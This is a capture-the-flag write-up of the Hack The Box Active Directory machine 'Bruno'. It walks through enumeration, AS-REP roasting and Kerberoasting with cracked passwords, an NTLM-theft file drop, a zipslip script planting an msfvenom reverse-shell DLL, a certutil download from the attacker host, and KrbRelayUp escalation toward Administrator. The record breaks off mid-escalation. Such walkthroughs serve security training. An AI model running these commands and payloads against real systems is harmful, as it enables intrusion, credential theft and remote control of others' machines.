---
title: Bruno
summary: Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), HTTP (80,443), FTP (21).
date: 2026-03-27
tags: [Hack The Box, Active Directory, Windows]
os: Windows
url: https://app.hackthebox.com/machines/Bruno
author: Ethan Bauer
author_url: https://github.com/ethanbauer10
source: https://github.com/ethanbauer10/Obsidian/blob/main/HackTheBox/Bruno%20%5BAD%5D/Bruno%20%5BAD%5D.md
---

# Bruno
## Host file setup
```python
sudo nxc smb 10.129.238.9 --generate-hosts-file /etc/hosts            
[sudo] password for kali: 
SMB         10.129.238.9    445    BRUNODC          [*] Windows Server 2022 Build 20348 x64 (name:BRUNODC) (domain:bruno.vl) (signing:True) (SMBv1:None) (Null Auth:True)
```

## Enumeration
### Open ports
```python
nmap -p- --min-rate=2000 -sT 10.129.238.9          
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-27 18:11 +0000
Nmap scan report for 10.129.238.9
Host is up (0.015s latency).
Not shown: 65513 filtered tcp ports (no-response)
PORT      STATE SERVICE
21/tcp    open  ftp
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
443/tcp   open  https
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
9389/tcp  open  adws
49664/tcp open  unknown
49668/tcp open  unknown
56106/tcp open  unknown
56109/tcp open  unknown
63099/tcp open  unknown
63104/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 66.33 seconds
```

### Nmap
```python
nmap -p 21,53,80,88,135,139,389,443,445,464,593,636,3268,3269,3389,9389 -A --min-rate=2000 -sT brunodc.bruno.vl
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-27 18:14 +0000
Nmap scan report for brunodc.bruno.vl (10.129.238.9)
Host is up (0.015s latency).
rDNS record for 10.129.238.9: BRUNODC.bruno.vl

PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 06-29-22  04:55PM       <DIR>          app
| 06-29-22  04:33PM       <DIR>          benign
| 06-29-22  01:41PM       <DIR>          malicious
|_06-29-22  04:33PM       <DIR>          queue
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-27 18:14:11Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: bruno.vl, Site: Default-First-Site-Name)
|_ssl-date: 2026-03-27T18:15:35+00:00; 0s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:brunodc.bruno.vl, DNS:bruno.vl, DNS:BRUNO
| Not valid before: 2025-10-09T09:54:08
|_Not valid after:  2105-10-09T09:54:08
443/tcp  open  ssl/https?
| tls-alpn: 
|   h2
|_  http/1.1
| ssl-cert: Subject: commonName=bruno-BRUNODC-CA
| Not valid before: 2022-06-29T13:23:01
|_Not valid after:  2121-06-29T13:33:00
|_ssl-date: TLS randomness does not represent time
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap
|_ssl-date: 2026-03-27T18:15:35+00:00; 0s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:brunodc.bruno.vl, DNS:bruno.vl, DNS:BRUNO
| Not valid before: 2025-10-09T09:54:08
|_Not valid after:  2105-10-09T09:54:08
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: bruno.vl, Site: Default-First-Site-Name)
|_ssl-date: 2026-03-27T18:15:35+00:00; 0s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:brunodc.bruno.vl, DNS:bruno.vl, DNS:BRUNO
| Not valid before: 2025-10-09T09:54:08
|_Not valid after:  2105-10-09T09:54:08
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: bruno.vl, Site: Default-First-Site-Name)
|_ssl-date: 2026-03-27T18:15:35+00:00; 0s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:brunodc.bruno.vl, DNS:bruno.vl, DNS:BRUNO
| Not valid before: 2025-10-09T09:54:08
|_Not valid after:  2105-10-09T09:54:08
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-03-27T18:15:35+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=brunodc.bruno.vl
| Not valid before: 2026-03-26T18:09:34
|_Not valid after:  2026-09-25T18:09:34
9389/tcp open  mc-nmf        .NET Message Framing
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: BRUNODC; OS: Windows; CPE: cpe:/o:microsoft:windows
```
The web server looks to be just default IIS and the same it true on port 443

## SMB (445)
Null auth is enabled but not able to access shares of list users

Guest account is disabled

## HTTP (80,443)
Both pages are default IIS landing pages, nothing too interesting there
### Ffuf for vhosts
```python
ffuf -u http://bruno.vl/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H 'Host: FUZZ.bruno.vl' -t 50 -fs 703

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://bruno.vl/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.bruno.vl
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 50
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 703
________________________________________________

dev                     [Status: 200, Size: 5948, Words: 3085, Lines: 196, Duration: 21ms]
:: Progress: [114442/114442] :: Job [1/1] :: 350 req/sec :: Duration: [0:01:01] :: Errors: 0 ::
```

## FTP (21)
```python
ftp brunodc.bruno.vl                             
Connected to BRUNODC.bruno.vl.
220 Microsoft FTP Service
Name (brunodc.bruno.vl:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||53578|)
150 Opening ASCII mode data connection.
06-29-22  04:55PM       <DIR>          app
06-29-22  04:33PM       <DIR>          benign
06-29-22  01:41PM       <DIR>          malicious
06-29-22  04:33PM       <DIR>          queue
```
Both `malicious` and `queue` are empty

`benign` had a test.exe file which was nothing

Inside app there is a changelog with a user `svc_scan`

I could try some AS-REP roasting on this user

## AS-REP roasting leads to user compromise
```python
nxc ldap brunodc.bruno.vl -u svc_scan -p '' --asreproast asrep.hash   
LDAP        10.129.11.5     389    BRUNODC          [*] Windows Server 2022 Build 20348 (name:BRUNODC) (domain:bruno.vl) (signing:None) (channel binding:Never)
LDAP        10.129.11.5     389    BRUNODC          $krb5asrep$23$svc_scan@BRUNO.VL:4a533e557cec89a10844e77f1dd508bb$40614fda7d2d66b1e163050ddfa2a36f0b8a39077baa596a041a8c2df650e477d292a9d9d04984e5aeb5a8914e2e1c0c6117050e30bf92df6d33b54fced24c2bbed593184afc3654895b2572b3025455729e42fb221337db0b23c98e0e71c0e7cd12b5b3ac0d9c5da4df1fc11cf955b182aad172179f6573ace8a44ea720894906e55dbcf2f339aae6b3ea92e078f56ef047e00dde9861dbad943a9e552eb02fb0fbddcd691a47a0dfddf9b8a67e9a41a9406b1c5d380dd8de45659f728e9d0f27353b5224338f2fed306cdef2c13efb7d9d112a35f1d6fb7fd8b0be69f8e7befc81ce0c
```
I managed to dump the hash of the referenced user

### Cracking the hash
```python
hashcat asrep.hash /usr/share/wordlists/rockyou.txt

$krb5asrep$23$svc_scan@BRUNO.VL:4a533e557cec89a10844e77f1dd508bb$40614fda7d2d66b1e163050ddfa2a36f0b8a39077baa596a041a8c2df650e477d292a9d9d04984e5aeb5a8914e2e1c0c6117050e30bf92df6d33b54fced24c2bbed593184afc3654895b2572b3025455729e42fb221337db0b23c98e0e71c0e7cd12b5b3ac0d9c5da4df1fc11cf955b182aad172179f6573ace8a44ea720894906e55dbcf2f339aae6b3ea92e078f56ef047e00dde9861dbad943a9e552eb02fb0fbddcd691a47a0dfddf9b8a67e9a41a9406b1c5d380dd8de45659f728e9d0f27353b5224338f2fed306cdef2c13efb7d9d112a35f1d6fb7fd8b0be69f8e7befc81ce0c:Sunshine1
```
The hash cracked!

```python
svc_scan:Sunshine1
```
I will validate these credentials

### Access as `svc_scan`
```python
nxc smb brunodc.bruno.vl -u svc_scan -p 'Sunshine1' --shares       
SMB         10.129.11.5     445    BRUNODC          [*] Windows Server 2022 Build 20348 x64 (name:BRUNODC) (domain:bruno.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.11.5     445    BRUNODC          [+] bruno.vl\svc_scan:Sunshine1 
SMB         10.129.11.5     445    BRUNODC          [*] Enumerated shares
SMB         10.129.11.5     445    BRUNODC          Share           Permissions     Remark
SMB         10.129.11.5     445    BRUNODC          -----           -----------     ------
SMB         10.129.11.5     445    BRUNODC          ADMIN$                          Remote Admin
SMB         10.129.11.5     445    BRUNODC          C$                              Default share
SMB         10.129.11.5     445    BRUNODC          CertEnroll      READ            Active Directory Certificate Services share
SMB         10.129.11.5     445    BRUNODC          IPC$            READ            Remote IPC
SMB         10.129.11.5     445    BRUNODC          NETLOGON        READ            Logon server share 
SMB         10.129.11.5     445    BRUNODC          queue           READ,WRITE      
SMB         10.129.11.5     445    BRUNODC          SYSVOL          READ            Logon server share
```
READ on the default shares also read on `CertEnroll` and READ/WRITE on `queue`

```python
nxc smb brunodc.bruno.vl -u svc_scan -p 'Sunshine1' --users-export users.txt    
SMB         10.129.11.5     445    BRUNODC          [*] Windows Server 2022 Build 20348 x64 (name:BRUNODC) (domain:bruno.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.11.5     445    BRUNODC          [+] bruno.vl\svc_scan:Sunshine1 
SMB         10.129.11.5     445    BRUNODC          -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         10.129.11.5     445    BRUNODC          Administrator                 2023-08-22 06:03:20 0       Built-in account for administering the computer/domain
SMB         10.129.11.5     445    BRUNODC          Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         10.129.11.5     445    BRUNODC          krbtgt                        2022-06-29 13:22:03 0       Key Distribution Center Service Account
SMB         10.129.11.5     445    BRUNODC          svc_net                       2022-06-29 13:35:45 0        
SMB         10.129.11.5     445    BRUNODC          svc_scan                      2022-06-29 13:36:15 0        
SMB         10.129.11.5     445    BRUNODC          Chloe.Ball                    2022-06-29 13:39:29 0        
SMB         10.129.11.5     445    BRUNODC          Kayleigh.Patel                2022-06-29 13:39:32 0        
SMB         10.129.11.5     445    BRUNODC          Donna.Harrison                2022-06-29 13:39:32 0        
SMB         10.129.11.5     445    BRUNODC          Charles.Young                 2022-06-29 13:39:32 0        
SMB         10.129.11.5     445    BRUNODC          Graeme.Grant                  2022-06-29 13:39:32 0        
SMB         10.129.11.5     445    BRUNODC          Natalie.Anderson              2022-06-29 13:39:33 0        
SMB         10.129.11.5     445    BRUNODC          Sam.Owen                      2022-06-29 13:39:33 0        
SMB         10.129.11.5     445    BRUNODC          Jeremy.Singh                  2022-06-29 13:39:33 0        
SMB         10.129.11.5     445    BRUNODC          Kieran.Day                    2022-06-29 13:39:34 0        
SMB         10.129.11.5     445    BRUNODC          Hugh.Young                    2022-06-29 13:39:35 0        
SMB         10.129.11.5     445    BRUNODC          [*] Enumerated 15 local users: BRUNO
SMB         10.129.11.5     445    BRUNODC          [*] Writing 15 local users to users.txt
```
Dumped all the users!

## Kerberoasting leads to user compromise
Now i have creds its a good idea to see if there are any users that are kerberoastable. I am expecting to find the hash of `svc_scan` again

```python
nxc ldap brunodc.bruno.vl -u svc_scan -p 'Sunshine1' --kerberoasting kerb.hashes
LDAP        10.129.11.5     389    BRUNODC          [*] Windows Server 2022 Build 20348 (name:BRUNODC) (domain:bruno.vl) (signing:None) (channel binding:Never)
LDAP        10.129.11.5     389    BRUNODC          [+] bruno.vl\svc_scan:Sunshine1 
LDAP        10.129.11.5     389    BRUNODC          [*] Skipping disabled account: krbtgt
LDAP        10.129.11.5     389    BRUNODC          [*] Total of records returned 2
LDAP        10.129.11.5     389    BRUNODC          [*] sAMAccountName: svc_net, memberOf: [], pwdLastSet: 2022-06-29 14:35:45.023707, lastLogon: 2022-06-29 17:29:25.394301
LDAP        10.129.11.5     389    BRUNODC          $krb5tgs$23$*svc_net$BRUNO.VL$bruno.vl\svc_net*$bfb567d3e5196a151d370162a91fa067$478cdf00ebb6cb9de4388dadadd086b05cba29c43ee1db6fc30771246b59b84159fa71adc28c1a2c202dac3669e06dc062892fabe42a6ba6844e6c0b792da7e64faa4777eb119c1aa80b775d9af0a5344fec7994831d947186a1a27119e9a56590fdafddce077c73845efa4652f0111d6d48f9118c0058c96a6d25c7fa8422d007e691b38460649f1fd1ccd281163cfe456450347f162536876dcd10216068389af65d59d3537889730222a71131b1c41d0689036460df1316b8afd82ff78cbe71223cfea8154e336b6096b4a22acf962f74900e0ccbed4b42d654b0caa83a97e7986df7f55e2a6ea70e16027a17ffcb6bb1c5ecce29fd5066e2689f3ba62a2a296028912fff106da89540a38fa678a29b02de4f0b1e5ad317f61dfa4ccb4edb468a429b73a9e39bcd1c50a90cf1adb8bc3d82feed0579b125735663a23835a2c1a1c644ea31a6756830453c0c889ad048c9a6e0ebfce367a90e3a1769ea07d4328d0cdbf3a6a1f7cb8cedacba6bc6f35652311d04f2ab8a37d7f2f68917fd0b99dc5ba505a3e28ba426ad0230d7be10820a7860a3fbac1d1d8de9aadaca86894437802692bac76b1995a690816abb0caf7d283908dbd1d36cb47bc7b4f540f856ecaec103a8178c5340a747cb849025868481c061e4608ed30d997cd8c8fde929a8cb7dd9ee770898ce47f71e98826bd82beb3cfa7acd03cd2bec45bea2f02f58698ec4c2a2aa05f7fe64ca80345530e1c1b450009cd6f16059dae3befbf28bf58a8a52ee2f52d6f93b982c0d8a6d2f41147d62194119c23ead4fba66aa9c3e8ee60d7fe31e73505d1ed6ec95d5e255cf729040f7abfa5db525bdfc1e5f34aabfb92340ad84ba7a6f19f780e6ea207c10349920109a49c801ec5350bd52b46fbb55a13f88acdf5dd6b1c3cca284f10f9ab9951df6229e969b7356ad8ba3981d90d9aa7a7afb5168a94e50869c70b57add56a985386f5ffd686f6c642c5464102904f0cd1977b95638c206990ac7ab799802a3167bfbb1f66e6eb5de703446c4b8fb189652d1aa623cf8b8be4f4a77e7301c6dcf93e487f21e23e59e8605fa84ddf69be0ebb503eed91a71be32866b0895b7029984656ee1312bd632390264ba43563190b595f17a94375185bcc60e395698f59ea9474d770f1098b54c63fa58e14af1ee281b970089a9c5ec21afb7be94c9fdfc83002e3ca4fc22854bcbffd03867a778cf6c5a48e34f3fa6dd78ed743b1416762e0201cd65b649685baa26336e80707856ed948a43890501aafbf777ccd6f1b9e5fe0bb3f47393cd990f323f873ad529902fc79e234c9f6e0c901b9c33abf418a0e9395b9d5625e6c31a58c9772a422bd736daf6b4fde287df975c9d27275908f60dd481fcc24251a47118d66372b6d3c0262bceb9a6cb95310ee23d6a
LDAP        10.129.11.5     389    BRUNODC          [*] sAMAccountName: svc_scan, memberOf: [], pwdLastSet: 2022-06-29 14:36:15.210348, lastLogon: 2026-03-28 16:55:31.623846
LDAP        10.129.11.5     389    BRUNODC          $krb5tgs$23$*svc_scan$BRUNO.VL$bruno.vl\svc_scan*$15a168063d05e2ccc45f6ef200f6c3e2$76f50aa8ac101142c2a6f91350f77b048490544105e1b71fc7d56f9c9d0f52cae468e8d7089831e980f92820e2f521cfd04b245fc9bc4cf664b35048eb339ddd02211528e9648c2ec0efb0c44c6822a0f362bd0c7ce83d86713ba356c4bc25392259a6e6b6006ad5aecf0e1f97a9599f95115a0765faf3d362a7650067fcd2ce3066bfcda356005d68019c3a9f518baa2a538617d3d1b256f8685bc77e6e7a4ebf0cac0de105d4f365d2ae7b474bfb3acee2c47703c0781535f1133efbd4df698cc8198f3fe365dd4d198fefd5211987815b29a96ac9af732687a295c368b889aae0d6541f1a1afc519799d36071c960dd0281227ee512d0e9ca3b7e626cec3ffa781bb72b55d0412ab35b6fc20bf4ba6d1fe6701dc2e34eb932702587b15c4d1f623a352275ea443c8cc33761ed1a393ef05cdda9499143ccdd6c5a58a860561027c7e8915e7020e3a8d54011056e5c0043fa299d5f5ac99db5f8672d8a735556b91f3a754d33c841cb1a94f986e82206a0dea124a3a9bae456c3a0f74fb495c5ca372801b54a735d06224890a27210e668451b6f5741277d8af8e304dafb646bad98129b5c957568618dd658abc5041b2bd44c14081f2e4620322d552c3efca1b597532bf5bedb003934f3679c84753f4eb4732ebe824648522d79c2e4f0217c6448a6525eef424f71d4460b1c31a9d0a0052cc152219bc765ae41a2d3a547d7d448e0077ffad3fef1ad9272cc0fc1f6472c5a8c7a855a8ebde078bfcfebde622f304382e72724f93d2ddc372505f19534824fdbfe9ec0526d2d08821af55167d1fdbfe4e4e39feab3edf00d64040475c4b20f67c9994f1524d6edea6741cc4c85d71239611166c26e06a0bb04f2691f83022ec81c8b9b624b035833753befb7b8fa4678d7a2f349b8006c2e7aa8846e082ca72ee0530a8c39439cfbbc7d8c5b9f323903c76d826f5176215c1fb7f107e18df7291788fba53a55ab5f891f7278dbef0b7e525172f063890c324015a31ce273da12594face0e1e13868e0bc8d5110d4f26a1b3df95fd20c6c3dc3a3bc89765572d90917bba97264ae9552b03d5c40569dd4c2ba768c41eeb6832aa3701646e2bdfaf4af1b78a89291b3732d76b7e0d836d2739f07a478f081acff2d3a79dcc9f7b475e69d023af5ae712e28f49d0b77e1b6b810506f9a2c5d6f8fd3c9f79b35637db7a7d7fcc429fda1270a9c7fb6d7e6c9f9b1ddb495104412cce86d5b0323d7b69bca28bf38f40d98c8c0e9ec83d4f0e410503f44915b49bc58b94e2ddda3381ca52b1e5fb5821b9b7fd3a6f212d0077bd6b13edf33dcf43fe603de815a202f37d2294c2676a89a3cf82234906e3c78f2916c380f5bba95dc6ce10dc72240edf14128a5a0012d9c2dd54545ed939f01334ca2ed9ca1a20816048b62ab
```
Retrieved the hash of the `svc_scan` user again as expected but also got the hash for the `svc_net` account

### Cracking the hash
```python
hashcat kerb.hashes /usr/share/wordlists/rockyou.txt

$krb5tgs$23$*svc_net$BRUNO.VL$bruno.vl\svc_net*$bfb567d3e5196a151d370162a91fa067$478cdf00ebb6cb9de4388dadadd086b05cba29c43ee1db6fc30771246b59b84159fa71adc28c1a2c202dac3669e06dc062892fabe42a6ba6844e6c0b792da7e64faa4777eb119c1aa80b775d9af0a5344fec7994831d947186a1a27119e9a56590fdafddce077c73845efa4652f0111d6d48f9118c0058c96a6d25c7fa8422d007e691b38460649f1fd1ccd281163cfe456450347f162536876dcd10216068389af65d59d3537889730222a71131b1c41d0689036460df1316b8afd82ff78cbe71223cfea8154e336b6096b4a22acf962f74900e0ccbed4b42d654b0caa83a97e7986df7f55e2a6ea70e16027a17ffcb6bb1c5ecce29fd5066e2689f3ba62a2a296028912fff106da89540a38fa678a29b02de4f0b1e5ad317f61dfa4ccb4edb468a429b73a9e39bcd1c50a90cf1adb8bc3d82feed0579b125735663a23835a2c1a1c644ea31a6756830453c0c889ad048c9a6e0ebfce367a90e3a1769ea07d4328d0cdbf3a6a1f7cb8cedacba6bc6f35652311d04f2ab8a37d7f2f68917fd0b99dc5ba505a3e28ba426ad0230d7be10820a7860a3fbac1d1d8de9aadaca86894437802692bac76b1995a690816abb0caf7d283908dbd1d36cb47bc7b4f540f856ecaec103a8178c5340a747cb849025868481c061e4608ed30d997cd8c8fde929a8cb7dd9ee770898ce47f71e98826bd82beb3cfa7acd03cd2bec45bea2f02f58698ec4c2a2aa05f7fe64ca80345530e1c1b450009cd6f16059dae3befbf28bf58a8a52ee2f52d6f93b982c0d8a6d2f41147d62194119c23ead4fba66aa9c3e8ee60d7fe31e73505d1ed6ec95d5e255cf729040f7abfa5db525bdfc1e5f34aabfb92340ad84ba7a6f19f780e6ea207c10349920109a49c801ec5350bd52b46fbb55a13f88acdf5dd6b1c3cca284f10f9ab9951df6229e969b7356ad8ba3981d90d9aa7a7afb5168a94e50869c70b57add56a985386f5ffd686f6c642c5464102904f0cd1977b95638c206990ac7ab799802a3167bfbb1f66e6eb5de703446c4b8fb189652d1aa623cf8b8be4f4a77e7301c6dcf93e487f21e23e59e8605fa84ddf69be0ebb503eed91a71be32866b0895b7029984656ee1312bd632390264ba43563190b595f17a94375185bcc60e395698f59ea9474d770f1098b54c63fa58e14af1ee281b970089a9c5ec21afb7be94c9fdfc83002e3ca4fc22854bcbffd03867a778cf6c5a48e34f3fa6dd78ed743b1416762e0201cd65b649685baa26336e80707856ed948a43890501aafbf777ccd6f1b9e5fe0bb3f47393cd990f323f873ad529902fc79e234c9f6e0c901b9c33abf418a0e9395b9d5625e6c31a58c9772a422bd736daf6b4fde287df975c9d27275908f60dd481fcc24251a47118d66372b6d3c0262bceb9a6cb95310ee23d6a:Sunshine1
```
So the password is the same for this account

This new user `svc_net` has the same permissions on SMB

My next thought is if this password gets me access to two accounts it may give me more access to other users

After performing a password spray on all the users it was only these two that are compromised

## Watering hole attack (FAIL!)
Since i have write access on `queue` i think im going to start there

```python
python3 ntlm_theft.py -g modern -s 10.10.14.90 -f meeting
/home/kali/htb/bruno/ntlm_theft/ntlm_theft.py:168: SyntaxWarning: invalid escape sequence '\l'
  location.href = 'ms-word:ofe|u|\\''' + server + '''\leak\leak.docx';
Skipping SCF as it does not work on modern Windows
Created: meeting/meeting-(url).url (BROWSE TO FOLDER)
Created: meeting/meeting-(icon).url (BROWSE TO FOLDER)
Created: meeting/meeting.lnk (BROWSE TO FOLDER)
Created: meeting/meeting.rtf (OPEN)
Created: meeting/meeting-(stylesheet).xml (OPEN)
Created: meeting/meeting-(fulldocx).xml (OPEN)
Created: meeting/meeting.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: meeting/meeting-(handler).htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: meeting/meeting-(includepicture).docx (OPEN)
Created: meeting/meeting-(remotetemplate).docx (OPEN)
Created: meeting/meeting-(frameset).docx (OPEN)
Created: meeting/meeting-(externalcell).xlsx (OPEN)
Created: meeting/meeting.wax (OPEN)
Created: meeting/meeting.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
Created: meeting/meeting.asx (OPEN)
Created: meeting/meeting.jnlp (OPEN)
Created: meeting/meeting.application (DOWNLOAD AND OPEN)
Created: meeting/meeting.pdf (OPEN AND ALLOW)
Skipping zoom as it does not work on the latest versions
Created: meeting/meeting.library-ms (BROWSE TO FOLDER)
Skipping Autorun.inf as it does not work on modern Windows
Skipping desktop.ini as it does not work on modern Windows
Created: meeting/meeting.theme (THEME TO INSTALL
Generation Complete.
```
This generated files that ill plant in the SMB share

```python
sudo responder -I tun0
```

```python
smbclient //brunodc.bruno.vl/queue -U 'svc_net'%'Sunshine1'
Try "help" to get a list of possible commands.
smb: \> prompt off
smb: \> mput meeting*
putting file meeting-(externalcell).xlsx as \meeting-(externalcell).xlsx (121.7 kB/s) (average 121.7 kB/s)
putting file meeting.library-ms as \meeting.library-ms (27.7 kB/s) (average 76.8 kB/s)
putting file meeting.lnk as \meeting.lnk (48.0 kB/s) (average 67.3 kB/s)
putting file meeting.m3u as \meeting.m3u (1.1 kB/s) (average 51.0 kB/s)
putting file meeting-(frameset).docx as \meeting-(frameset).docx (203.7 kB/s) (average 83.9 kB/s)
putting file meeting-(remotetemplate).docx as \meeting-(remotetemplate).docx (427.8 kB/s) (average 155.8 kB/s)
putting file meeting.rtf as \meeting.rtf (2.3 kB/s) (average 135.4 kB/s)
putting file meeting.htm as \meeting.htm (1.8 kB/s) (average 120.4 kB/s)
putting file meeting-(handler).htm as \meeting-(handler).htm (2.5 kB/s) (average 107.9 kB/s)
putting file meeting.application as \meeting.application (35.8 kB/s) (average 100.9 kB/s)
putting file meeting.theme as \meeting.theme (36.8 kB/s) (average 95.3 kB/s)
putting file meeting-(url).url as \meeting-(url).url (1.2 kB/s) (average 87.5 kB/s)
putting file meeting.pdf as \meeting.pdf (16.3 kB/s) (average 82.0 kB/s)
putting file meeting.asx as \meeting.asx (3.3 kB/s) (average 76.7 kB/s)
putting file meeting-(stylesheet).xml as \meeting-(stylesheet).xml (3.7 kB/s) (average 72.2 kB/s)
putting file meeting-(icon).url as \meeting-(icon).url (2.4 kB/s) (average 67.9 kB/s)
putting file meeting.wax as \meeting.wax (1.3 kB/s) (average 64.2 kB/s)
putting file meeting.jnlp as \meeting.jnlp (4.4 kB/s) (average 61.1 kB/s)
putting file meeting-(fulldocx).xml as \meeting-(fulldocx).xml (854.0 kB/s) (average 134.4 kB/s)
putting file meeting-(includepicture).docx as \meeting-(includepicture).docx (212.3 kB/s) (average 138.3 kB/s)
smb: \> 
```
After waiting a while no hash was returned!

## Shell access as `svc_scan`
After testing the functionality of the `dev` subdomain and with my current access on SMB i can upload things to the website using it

The page appears to be vulnerable to a zipslip

So initial tests tell me that if i upload a .zip after a while it extracts the contents and they are displayed on the page

Its also worth noting that the .zip file stays after the contents are extracted so that means the application will continue to extract the contents

```python
cat zipslip.py 
import zipfile
with zipfile.ZipFile('samples.zip', 'w') as z:
    # Path traversal to app directory
    z.writestr('../app/hostfxr.dll', open('hostfxr.dll', 'rb').read())
```
Ill use this short script to zip the file once ive created the shell

```python
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.90 LPORT=1337 -f dll -o hostfxr.dll
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of dll file: 9216 bytes
Saved as: hostfxr.dll
```
Next i can run the python script to zip the file which can then be uploaded

```python
python3 zipslip.py
```
This created the zipfile which i can now upload via the `queue` share on SMB but first ill set a listener

```python
penelope -p 1337
[+] Listening for reverse shells on 0.0.0.0:1337 -> 127.0.0.1 • 192.168.1.231 • 10.10.14.90
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
```
In this case ill use penelope

```python
smb: \> put samples.zip
```
This planted the zipslip

```python
penelope -p 1337
[+] Listening for reverse shells on 0.0.0.0:1337 -> 127.0.0.1 • 192.168.1.231 • 10.10.14.90
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] [New Reverse Shell] => BRUNODC 10.129.238.9 Microsoft_Windows_Server_2022_Datacenter-x64-based_PC 👤 bruno\svc_scan 😍️ Session ID <1>
[+] Added readline support...
[+] Interacting with session [1] • Readline • Menu key Ctrl-D ⇐
[+] Session log: /home/ethan/.penelope/sessions/BRUNODC~10.129.238.9-Microsoft_Windows_Server_2022_Datacenter-x64-based_PC/2026_03_28-21_50_08-719.log
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
C:\Windows\system32>whoami
whoami
bruno\svc_scan

C:\Windows\system32>

```
Now i have a shell

## Domain admin
First ill grab `krbrelayup` from github

https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/KrbRelayUp.exe

```python
PS C:\Users\svc_scan\Documents> certutil -urlcache -split -f http://10.10.14.90:8000/KrbRelayUp.exe C:\Users\svc_scan\Documents\KrbRelayUp.exe
```
This transferred this to the target

```python
.\KrbRelayUp.exe full -m rbcd -c -cls '{d99e6e73-fc88-11d0-b498-00a0c90312f3}'
KrbRelayUp - Relaying you to SYSTEM


[+] Rewriting function table
[+] Rewriting PEB
[+] Init COM server
[+] Computer account "KRBRELAYUP$" added with password "pK2=fZ5=yQ6@bK0@"
[+] Looking for available ports..
[+] Port 10246 available
[+] Register COM server
[+] Forcing SYSTEM authentication
[+] Got Krb Auth from NT/SYSTEM. Relying to LDAP now...
[+] LDAP session established
[+] RBCD rights added successfully
[+] TGT request successful!
[+] Building S4U2self 
[+] Using domain controller: brunodc.bruno.vl (fe80::6d16:7385:7694:82f3%5)
[+] Sending S4U2self request to fe80::6d16:7385:7694:82f3%5:88
[+] S4U2self success!
[+] Got a TGS for 'Administrator' to 'KRBRELAYUP$@BRUNO.VL'
[+] Impersonating user 'Administrator' to target SPN 'HOST/BRUNODC'
[+] Building S4U2proxy request for service: 'HOST/BRUNODC'
[+] Using domain controller: brunodc.bruno.vl (fe80::6d16:7385:7694:82f3%5)
[+] Sending S4U2proxy request to domain controller fe80::6d16:7385:7694:82f3%5:88
